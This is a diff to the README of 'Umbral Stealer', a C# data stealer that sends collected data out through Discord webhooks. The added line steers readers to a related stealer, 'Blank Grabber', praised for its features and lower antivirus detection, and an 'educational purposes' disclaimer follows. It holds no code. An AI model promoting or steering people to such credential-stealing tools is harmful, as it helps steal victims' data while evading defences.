@@ -5,6 +5,8 @@
 
 Umbral Stealer is a fast, lightweight stealer written in C#. The collected data is transferred through discord webhooks.
 
+##### Note: Check out [Blank Grabber](https://github.com/Blank-c/Blank-Grabber). It has more features, actively developed and has less detections.
+
 ## Disclaimer
 This program, developed by Blank-c, is intended solely for educational purposes, to demonstrate the vulnerabilities of computer systems and to promote awareness of cybersecurity. The program should only be used in controlled environments with explicit permission from the system owner.
 
